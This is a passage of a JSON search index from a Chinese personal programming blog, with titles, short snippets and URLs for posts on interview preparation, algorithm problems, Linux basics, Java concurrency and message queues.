语言要设置","lvl0":"流程图，时序图","lvl1":null,"lvl2":"摘要","objectID":"603cc46f5e2501d444e538990e5239e4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/markdown%E8%AF%AD%E6%B3%95/%E6%B5%81%E7%A8%8B%E5%9B%BE-%E6%97%B6%E5%BA%8F%E5%9B%BE%E5%86%99%E6%B3%95/"},{"content":"","lvl0":"面试自我介绍","lvl1":null,"lvl2":"摘要","objectID":"515d9a01733c814efa9d6afe30b906bb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E9%9D%A2%E8%AF%95_%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"},{"content":"打家劫舍问题 213. 打家劫舍 II Difficulty: 中等 你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个","lvl0":"明源云笔试总结","lvl1":null,"lvl2":"摘要","objectID":"40471ef8d6e3bf366f83368320dc43c0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%98%8E%E6%BA%90%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93/"},{"content":"内网知识学习 内网渗透教程 工作组原理","lvl0":"内网知识学习","lvl1":null,"lvl2":"摘要","objectID":"dc62f2927a88ed7464939be9edeb730d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"content":"面试总结 抓包问题， 需要理解的： tcpdump go语言 比如 实现一个 网络连接 传输文件","lvl0":"品高软件","lvl1":null,"lvl2":"摘要","objectID":"cc3331854ee4ae035a072d6492a761e0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%93%81%E9%AB%98%E8%BD%AF%E4%BB%B6/"},{"content":"插入模式和覆盖模式 按 insert 键 ，可以 改为插入模式和覆盖模式： 插入模式，直接插入字符 覆盖模式，后面的被前面覆盖 快速选中一行【块】 shift + home shift + end shift + 上下","lvl0":"其他快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"094993c69dbdc914015b4c97ad6878e9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%85%B6%E4%BB%96%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"},{"content":"前端面试交流会笔记总结 1.面试（重点） 基础知识 举一反三 认真对待（面评） 吹牛逼 企业面试前100题目网站","lvl0":"前端面试交流会笔记","lvl1":null,"lvl2":"摘要","objectID":"735e75d892fb47c446666d0dc33b3995","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E4%BA%A4%E6%B5%81%E4%BC%9A%E7%AC%94%E8%AE%B0/"},{"content":"数据库： mysql索引， b树，b+树的对比，优势之类的。 mysql： 覆盖索引，回表，最左前缀匹配原则 mysql 索引优化， union 代替 or , 少用 != .. mysql 执行引擎","lvl0":"秋招必学【给学弟的指导】","lvl1":null,"lvl2":"摘要","objectID":"47820e8863d42881833108935b5e75f8","tags":["秋招"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%98%A5%E6%8B%9B%E5%BF%85%E5%AD%A6/"},{"content":"学习视频 cms的核心算法三色标记法 三色标记法： 逻辑上的抽象，将对象分为3种颜色， 黑色，表示 已经标记完成，确认不是垃圾，灰色自己标记完成了，但","lvl0":"三色标记 cms核心算法","lvl1":null,"lvl2":"摘要","objectID":"9d8f016ddb0d037dceb2a639654b7092","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E4%B8%89%E8%89%B2%E6%A0%87%E8%AE%B0cms%E6%A0%B8%E5%BF%83/"},{"content":"在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留。 样例1 1 2 3 输入：1-\u0026gt;2-\u0026gt;3-\u0026gt;3-\u0026","lvl0":"删除链表重复节点","lvl1":null,"lvl2":"摘要","objectID":"31c50168099f6110fbb960e571455c0b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E9%87%8D%E5%A4%8D%E8%8A%82%E7%82%B9/"},{"content":"深信服 [TOC] 深信服笔试 考察golang语法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;fmt\u0026#34; ) func Add(list []int, e int) { _ = append(list, e) } func main() { var list []int Add(list, 1) list = append(list, 21)","lvl0":"深信服笔试","lvl1":null,"lvl2":"摘要","objectID":"f27b992119eda616a85df3f3a7a8cc70","tags":["选择题刷题笔记"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%AC%94%E8%AF%95/"},{"content":"koa 的相关使用 koa 是个 基于后端 的框架 学习视频 这里使用 egg 框架 1 2 3 4 5 6 7 8 yarn add egg-init -g egg-init --type=simple ## 安装 配置 yarn # run npm run dev 连接 MYSQL 1 2 3 4 # 安装 egg-mysql 库 yarn add egg-mysql # 配置","lvl0":"什么是KOA","lvl1":null,"lvl2":"摘要","objectID":"24b01cd6f559a15c043203020c8559a5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/koa%E6%80%BB%E7%BB%93/%E4%BB%80%E4%B9%88%E6%98%AFkoa/"},{"content":"linux文件系统学习 学习教程1 学习教程2 linux内核学习教程 说话大声的教程，好用,EXT文件详解 文件系统的种类 U盘： FAT32 windows NTFS linux： EXT","lvl0":"什么是linux的文件系统","lvl1":null,"lvl2":"摘要","objectID":"b63d541cb1cf8925e00c975bd3c8998d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E4%BB%80%E4%B9%88%E6%98%AFlinux%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"Thread 模式类比的是工厂里车间工人的工作模式。但其实在现实世界，工厂里还有一种流水线的工作模式，类比到编程领域，就是生产者 - 消费者模式。 当然，除了","lvl0":"生产消费者模式","lvl1":null,"lvl2":"摘要","objectID":"3ff12599dc04ca98ba0189ef02aa4b84","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E7%94%9F%E4%BA%A7%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"content":"redis 优化技巧 避免 bigKey 一次可以多次 获取数据 mget mset hmget hmset 可以用 pipeline 将多次网络查询 改为一次网络查询","lvl0":"诗悦","lvl1":null,"lvl2":"摘要","objectID":"569ac6cfaef1e62847147715d2afddaf","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E8%AF%97%E6%82%A6/"},{"content":"线上问题定位的利器：线程栈 dump 为了便于分析定位线程问题，你需要给线程赋予一个有意义的名字，对于线程池可以通过自定义 ThreadFactory 来给线程池中的线程赋予有意","lvl0":"实践总论","lvl1":null,"lvl2":"摘要","objectID":"d112ff8f4ed178a5b8fb30aeabbdb5f0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/%E5%AE%9E%E8%B7%B5%E6%80%BB%E8%AE%BA/"},{"content":"词法分析原理 学习课程- 华南理工大学- 刘欣欣 参考教程 参考学习的课程 js 版本的课程 计算机编译的过程 词法分析 语法分析 中间代码生成 优化 目标代码产生 词法","lvl0":"实战脚本语言【词法分析】","lvl1":null,"lvl2":"摘要","objectID":"ab15222a6c77d4ec93c62f174772e032","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E5%AE%9E%E6%88%98%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/"},{"content":"使用vim的问题总结 1. 从网页复制的 yml到编辑器，编辑器缩进不对 解决的文章 解决vi/vim中粘贴会在行首多很多缩进和空格的问题 解决办法： 在拷","lvl0":"使用vim后遇到的一些问题【必知必会】","lvl1":null,"lvl2":"摘要","objectID":"a49a4aba42a29af327fcbe4bc8ad335a","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/%E4%BD%BF%E7%94%A8vim%E5%90%8E%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"},{"content":"输入两棵二叉树 $A，B$，判断 $ B $ 是不是$ A $ 的子结构。 我们规定空树不是任何树的子结构。 样例 树 AA： 1 2 3 4 5 6 7 8 / \\ 8 7 / \\ 9 2 / \\ 4","lvl0":"树的子结构","lvl1":null,"lvl2":"摘要","objectID":"564343ada27f9ef2a5d088153f988b39","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/"},{"content":"数据包记录 ，必刷 IP 数据包最大长度为 65535B(64K字节) 牛客题目链接","lvl0":"数据包常量刷题","lvl1":null,"lvl2":"摘要","objectID":"a1a86b6ad1a5c6e6836eb342adae3162","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%B8%B8%E9%87%8F%E5%88%B7%E9%A2%98/"},{"content":"数据流的中位数 如何得到一个数据流中的中位数？ 如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。 如果从数据流中读出偶","lvl0":"数据流的中位数","lvl1":null,"lvl2":"摘要","objectID":"517192c65c81d4a00d0657453557e363","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AE%B9%E5%99%A8/%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/"},{"content":"实现函数double Power(double base, int exponent)，求base的 exponent次方。 不得使用库函数，同时不需要考虑大数问题。 只要输出结果与答案的","lvl0":"数值的整数次方","lvl1":null,"lvl2":"摘要","objectID":"1f232496c148a3bbff1369ec7b5c5ec0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/"},{"content":"数字的排列问题 输入一组数字（可能包含重复数字），输出其所有的排列方式。 样例 1 2 3 4 5 6 7 8 9 10 11 输入：[1,2,3] 输出： [ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1] ] 去","lvl0":"数字的排列","lvl1":null,"lvl2":"摘要","objectID":"73ef78cc8d40d3ca438ca99009d9be5f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E6%95%B0%E5%AD%97%E7%9A%84%E6%8E%92%E5%88%97%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/"},{"content":"给定一个数字，我们按照如下规则把它翻译为字符串： 0 翻译成 a，1 翻译成 b，……， 11 翻译成 l，……，25 翻译成 z。 一个数字可能有多个翻译。 例如 12258","lvl0":"数字翻译为字符串","lvl1":null,"lvl2":"摘要","objectID":"81aedce6786ad160dc2dbe64266a9000","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。 假设数组非空，并且一定存在满足条件的数字。 思考题： 假设要求只能使用 $ O(n) $的时间","lvl0":"数组中出现次数超过一半的数字","lvl1":null,"lvl2":"摘要","objectID":"d1e101708c7e94a3189455c16e2937ca","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"usermod 命令 1 2 3 4 useradd lilei sudo usermod -aG sudo lilei # 给 lilei 添加到 sudo 用户组 su -l lilei 给user 用户分配权限","lvl0":"添加用户权限","lvl1":null,"lvl2":"摘要","objectID":"7b72161f908d0a6f011a1250245aab3c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/"},{"content":"定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。 思考题： 请同时实现迭代版本和递归版本。 样例 1 2 3 输入:1-\u0026gt;2","lvl0":"头插法，翻转链表","lvl1":null,"lvl2":"摘要","objectID":"ac76e363f9d2b924f14ac9a5263e24f6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%A4%B4%E6%8F%92%E6%B3%95_%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/"},{"content":"将一个骰子投掷 n 次，获得的总点数为 s ，s 的可能范围为 $ n∼6n $ 。 掷出某一点数，可能有多种掷法，例如投掷 2 次，掷出 3 点，共有 [1,2], [2,1] 两种掷法。 请","lvl0":"骰子的点数","lvl1":null,"lvl2":"摘要","objectID":"ac26d43516167fbb80cbc8ec89142f7f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E9%AA%B0%E5%AD%90%E7%82%B9%E6%95%B0dp/"},{"content":"王者段位java模式 参考视频 hystrix 降级 限流 配置 中心 阿波罗，config 等 微服务网关 zuul rbac模型 用户和角色是多对多的 一个 角色 多个用户，一个用户 多","lvl0":"王者段位java面试视频","lvl1":["八股文"],"lvl2":"摘要","objectID":"2ca42a100b0f85e37436f297eb632244","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%A7%86%E9%A2%91%E8%B5%84%E6%96%99%E5%AE%9E%E6%88%98/%E7%8E%8B%E8%80%85%E6%AE%B5%E4%BD%8Djava/"},{"content":"网易面试 网络分层结构 三次握手 两次握手可以吗？ 四次挥手 第四次挥手为什么要等待2MSL？ 为什么是四次挥手？ TCP有哪些特点？ TCP和UDP的区别","lvl0":"网易面试","lvl1":null,"lvl2":"摘要","objectID":"e3bbab5dcc58192e482291f6ad0f2bc0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E7%BD%91%E6%98%93%E9%9D%A2%E8%AF%95/"},{"content":"SOA 架构 SOA是什么？SOA全英文是Service-Oriented Architecture，中文意思是中文面向服务编程，是一种思想，一种方法","lvl0":"微服务架构","lvl1":null,"lvl2":"摘要","objectID":"116afb36de19f11e63bdbfffc228caaf","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84/"},{"content":"伪文件的定义 伪文件 不用来存储数据，本身不占用任何空间。是文件系统的一部分，并按目录进行组织 。 目的：提供一种服务，采取和常规文件相同的访问方式","lvl0":"伪文件 管道、信号原理","lvl1":null,"lvl2":"摘要","objectID":"ba7b3ba722f1d0872ea904f04ca4b53b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E4%BC%AA%E6%96%87%E4%BB%B6-%E7%AE%A1%E9%81%93-%E4%BF%A1%E5%8F%B7%E5%8E%9F%E7%90%86/"},{"content":"为什么要用 react react的历史背景 react 很简单 1个新的概念 4个必须的API 单向数据流 完善的错误提示 react解决了UI 细节的问题 数据模型怎么解决？","lvl0":"为什么要用react","lvl1":null,"lvl2":"摘要","objectID":"f5a8bae5416385a454b2a842d9544b61","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8react/"},{"content":"文件操作命令汇总 linux 中的通配符 通配符 解释 文件名 模糊匹配 * 匹配任意0-n个字符 luffy* luffyalex ? 匹配任意1 个字符 abc? abcd 符号集合 匹配一堆字符或者文本 符号集合 [abcd] 匹","lvl0":"文件操作","lvl1":null,"lvl2":"摘要","objectID":"a2302b76bc83befc7381238521373915","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"content":"文件权限 UGO ，acl 权限对象 属主： u 属组： g 其他人： o 权限类型 读 r 4 写 w 2 执行 x 1 chown 可以修改文件所有者 chgrp 可以改变属组 1 2 3 4 5 6 7 8 9 10 11 12 13","lvl0":"文件权限UGO,ACL","lvl1":null,"lvl2":"摘要","objectID":"94a9f76bb0b01043fc4180f4f47336c0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90-ugoacl/"},{"content":"文件压缩原理 学习视频 用 数字记录反复出现的 编码 可以用哈夫曼树建立一个编码字典 【频率越高编码越短】 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23","lvl0":"文件压缩原理","lvl1":["八股文"],"lvl2":"摘要","objectID":"55e9ba97950d7f648e38041a9f7a1b6a","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E5%8E%9F%E7%90%86/"},{"content":"网络物理设备题 在下列网间连接器中，（ ）在数据连路层实现网络互连。 https://www.nowcoder.com/test/question/done?tid=47443644\u0026amp;qid=94559#summary 中继器：中继器是工作在物理层上的连接设备。常用于两个网络节点之间物理信号的","lvl0":"物理设备理解刷题","lvl1":null,"lvl2":"摘要","objectID":"cb7cb74d3befcb9bdff99a18f450a115","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87%E7%90%86%E8%A7%A3%E9%A2%98/"},{"content":"线程和进程的区别 作者：peonyX 链接：https://www.nowcoder.com/discuss/723383?source_id=","lvl0":"线程安全的本质","lvl1":null,"lvl2":"摘要","objectID":"4204e4a24bc0baf1e796ebd1846a8f37","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E7%90%86%E8%A7%A3%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%9C%AC%E8%B4%A8/"},{"content":"线程安全和线程池 线程安全的理解，其实应该说内存安全比较好，堆是共享的 学习教程 JAVA 内存模型 栈 堆 新生代 eden s1 s2 老年代 程序计数器 本地方法栈 元空间 直接内","lvl0":"线程安全和线程池","lvl1":null,"lvl2":"摘要","objectID":"d471a1b6189e0cb5eb6c3259ff488857","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%A2%AB%E9%97%AE%E8%BF%87%E5%87%A0%E6%AC%A1%E4%BA%86/"},{"content":"没有小程序号的问题 不能上传和发布小程序 不能真机运行，只可以在PC 的模拟中运行 小程序页面简介 小程序的文件 wxml wxss js app.json 是小程序的 配置文件，可以配置小","lvl0":"相关概念","lvl1":null,"lvl2":"摘要","objectID":"bd5b2d4a5060eb602bdbd53bfbefda70","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/"},{"content":"消息传递性保证 **我们可以利用消息队列的有序性来验证是否有消息丢失。**原理非常简单，在 Producer 端，我们给每个发出的消息附加一个连续递增的序号，然","lvl0":"消息队列_业务_不丢消息【可靠性传递】","lvl1":["消息队列"],"lvl2":"摘要","objectID":"dd204bf848e40f012d995a4137f913e1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97_%E4%B8%9A%E5%8A%A1_%E4%B8%8D%E4%B8%A2%E6%B6%88%E6%81%AF%E8%A7%A3%E5%86%B3/"},{"content":"基础回顾 事务的特性 事务的特性: acid, 原子性，一致性，隔离性，持久性 rabbitMQ分布式事务 两阶段提交原理 1、rocketmq实现分布式事务，使","lvl0":"消息队列_业务_分布式事务","lvl1":["消息队列"],"lvl2":"摘要","objectID":"bc3b6d980bbf412493262e9763e4289e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97_%E4%B8%9A%E5%8A%A1_%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"content":"消息队列的作用 任务异步运行 服务解耦 流量控制 